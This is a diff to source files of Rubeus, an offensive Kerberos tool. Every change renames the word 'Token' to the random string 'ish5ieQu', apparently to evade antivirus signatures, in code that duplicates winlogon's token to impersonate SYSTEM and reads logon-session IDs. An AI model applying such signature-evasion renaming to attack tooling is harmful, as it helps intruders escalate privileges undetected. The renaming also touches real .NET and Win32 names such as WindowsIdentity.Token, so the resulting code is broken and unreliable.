@@ -69,7 +69,7 @@ namespace Rubeus
         #endregion
 
 
-        #region Token Helpers
+        #region ish5ieQu Helpers
 
         public static bool IsHighIntegrity()
         {
@@ -84,31 +84,31 @@ namespace Rubeus
             // helper to elevate to SYSTEM for Kerberos ticket enumeration via token impersonation
             if (IsHighIntegrity())
             {
-                IntPtr hToken = IntPtr.Zero;
+                IntPtr hish5ieQu = IntPtr.Zero;
 
-                // Open winlogon's token with TOKEN_DUPLICATE accesss so ca can make a copy of the token with DuplicateToken
+                // Open winlogon's token with TOKEN_DUPLICATE accesss so ca can make a copy of the token with Duplicateish5ieQu
                 Process[] processes = Process.GetProcessesByName("winlogon");
                 IntPtr handle = processes[0].Handle;
 
                 // TOKEN_DUPLICATE = 0x0002
-                bool success = Interop.OpenProcessToken(handle, 0x0002, out hToken);
+                bool success = Interop.OpenProcessish5ieQu(handle, 0x0002, out hish5ieQu);
                 if (!success)
                 {
-                    Console.WriteLine("[!] GetSystem() - OpenProcessToken failed!");
+                    Console.WriteLine("[!] GetSystem() - OpenProcessish5ieQu failed!");
                     return false;
                 }
 
                 // make a copy of the NT AUTHORITY\SYSTEM token from winlogon
                 // 2 == SecurityImpersonation
-                IntPtr hDupToken = IntPtr.Zero;
-                success = Interop.DuplicateToken(hToken, 2, ref hDupToken);
+                IntPtr hDupish5ieQu = IntPtr.Zero;
+                success = Interop.Duplicateish5ieQu(hish5ieQu, 2, ref hDupish5ieQu);
                 if (!success)
                 {
-                    Console.WriteLine("[!] GetSystem() - DuplicateToken failed!");
+                    Console.WriteLine("[!] GetSystem() - Duplicateish5ieQu failed!");
                     return false;
                 }
 
-                success = Interop.ImpersonateLoggedOnUser(hDupToken);
+                success = Interop.ImpersonateLoggedOnUser(hDupish5ieQu);
                 if (!success)
                 {
                     Console.WriteLine("[!] GetSystem() - ImpersonateLoggedOnUser failed!");
@@ -116,8 +116,8 @@ namespace Rubeus
                 }
 
                 // clean up the handles we created
-                Interop.CloseHandle(hToken);
-                Interop.CloseHandle(hDupToken);
+                Interop.CloseHandle(hish5ieQu);
+                Interop.CloseHandle(hDupish5ieQu);
 
                 if (!IsSystem())
                 {
@@ -141,29 +141,29 @@ namespace Rubeus
 
         public static LUID GetCurrentLUID()
         {
-            // helper that returns the current logon session ID by using GetTokenInformation w/ TOKEN_INFORMATION_CLASS
+            // helper that returns the current logon session ID by using Getish5ieQuInformation w/ TOKEN_INFORMATION_CLASS
 
-            var TokenInfLength = 0;
+            var ish5ieQuInfLength = 0;
             var luid = new LUID();
 
-            // first call gets lenght of TokenInformation to get proper struct size
-            var Result = Interop.GetTokenInformation(WindowsIdentity.GetCurrent().Token, Interop.TOKEN_INFORMATION_CLASS.TokenStatistics, IntPtr.Zero, TokenInfLength, out TokenInfLength);
+            // first call gets lenght of ish5ieQuInformation to get proper struct size
+            var Result = Interop.Getish5ieQuInformation(WindowsIdentity.GetCurrent().ish5ieQu, Interop.TOKEN_INFORMATION_CLASS.ish5ieQuStatistics, IntPtr.Zero, ish5ieQuInfLength, out ish5ieQuInfLength);
 
-            var TokenInformation = Marshal.AllocHGlobal(TokenInfLength);
+            var ish5ieQuInformation = Marshal.AllocHGlobal(ish5ieQuInfLength);
 
             // second call actually gets the information
-            Result = Interop.GetTokenInformation(WindowsIdentity.GetCurrent().Token, Interop.TOKEN_INFORMATION_CLASS.TokenStatistics, TokenInformation, TokenInfLength, out TokenInfLength);
+            Result = Interop.Getish5ieQuInformation(WindowsIdentity.GetCurrent().ish5ieQu, Interop.TOKEN_INFORMATION_CLASS.ish5ieQuStatistics, ish5ieQuInformation, ish5ieQuInfLength, out ish5ieQuInfLength);
 
             if (Result)
             {
-                var TokenStatistics = (Interop.TOKEN_STATISTICS)Marshal.PtrToStructure(TokenInformation, typeof(Interop.TOKEN_STATISTICS));
-                luid = new LUID(TokenStatistics.AuthenticationId);
+                var ish5ieQuStatistics = (Interop.TOKEN_STATISTICS)Marshal.PtrToStructure(ish5ieQuInformation, typeof(Interop.TOKEN_STATISTICS));
+                luid = new LUID(ish5ieQuStatistics.AuthenticationId);
             }
             else
             {
                 var lastError = Interop.GetLastError();
-                Console.WriteLine("[X] GetTokenInformation error: {0}", lastError);
-                Marshal.FreeHGlobal(TokenInformation);
+                Console.WriteLine("[X] Getish5ieQuInformation error: {0}", lastError);
+                Marshal.FreeHGlobal(ish5ieQuInformation);
             }
 
             return luid;
@@ -199,44 +199,44 @@ namespace Rubeus
             Console.WriteLine("[+] Process         : '{0}' successfully created with LOGON_TYPE = 9", commandLine);
             Console.WriteLine("[+] ProcessID       : {0}", pi.dwProcessId);
 
-            var hToken = IntPtr.Zero;
+            var hish5ieQu = IntPtr.Zero;
             // TOKEN_QUERY == 0x0008
-            var success = Interop.OpenProcessToken(pi.hProcess, 0x0008, out hToken);
+            var success = Interop.OpenProcessish5ieQu(pi.hProcess, 0x0008, out hish5ieQu);
             if (!success)
             {
                 var lastError = Interop.GetLastError();
-                Console.WriteLine("[X] OpenProcessToken error: {0}", lastError);
+                Console.WriteLine("[X] OpenProcessish5ieQu error: {0}", lastError);
                 return new LUID();
             }
 
-            var TokenInfLength = 0;
+            var ish5ieQuInfLength = 0;
             bool Result;
 
-            // first call gets lenght of TokenInformation to get proper struct size
-            Result = Interop.GetTokenInformation(hToken, Interop.TOKEN_INFORMATION_CLASS.TokenStatistics, IntPtr.Zero, TokenInfLength, out TokenInfLength);
+            // first call gets lenght of ish5ieQuInformation to get proper struct size
+            Result = Interop.Getish5ieQuInformation(hish5ieQu, Interop.TOKEN_INFORMATION_CLASS.ish5ieQuStatistics, IntPtr.Zero, ish5ieQuInfLength, out ish5ieQuInfLength);
 
-            var TokenInformation = Marshal.AllocHGlobal(TokenInfLength);
+            var ish5ieQuInformation = Marshal.AllocHGlobal(ish5ieQuInfLength);
 
             // second call actually gets the information
-            Result = Interop.GetTokenInformation(hToken, Interop.TOKEN_INFORMATION_CLASS.TokenStatistics, TokenInformation, TokenInfLength, out TokenInfLength);
+            Result = Interop.Getish5ieQuInformation(hish5ieQu, Interop.TOKEN_INFORMATION_CLASS.ish5ieQuStatistics, ish5ieQuInformation, ish5ieQuInfLength, out ish5ieQuInfLength);
 
             if (Result)
             {
-                var TokenStats = (Interop.TOKEN_STATISTICS)Marshal.PtrToStructure(TokenInformation, typeof(Interop.TOKEN_STATISTICS));
-                luid = new LUID(TokenStats.AuthenticationId);
+                var ish5ieQuStats = (Interop.TOKEN_STATISTICS)Marshal.PtrToStructure(ish5ieQuInformation, typeof(Interop.TOKEN_STATISTICS));
+                luid = new LUID(ish5ieQuStats.AuthenticationId);
                 Console.WriteLine("[+] LUID            : {0}", luid);
             }
             else
             {
                 var lastError = Interop.GetLastError();
-                Console.WriteLine("[X] GetTokenInformation error: {0}", lastError);
-                Marshal.FreeHGlobal(TokenInformation);
-                Interop.CloseHandle(hToken);
+                Console.WriteLine("[X] Getish5ieQuInformation error: {0}", lastError);
+                Marshal.FreeHGlobal(ish5ieQuInformation);
+                Interop.CloseHandle(hish5ieQu);
                 return new LUID();
             }
 
-            Marshal.FreeHGlobal(TokenInformation);
-            Interop.CloseHandle(hToken);
+            Marshal.FreeHGlobal(ish5ieQuInformation);
+            Interop.CloseHandle(hish5ieQu);
 
             return luid;
         }
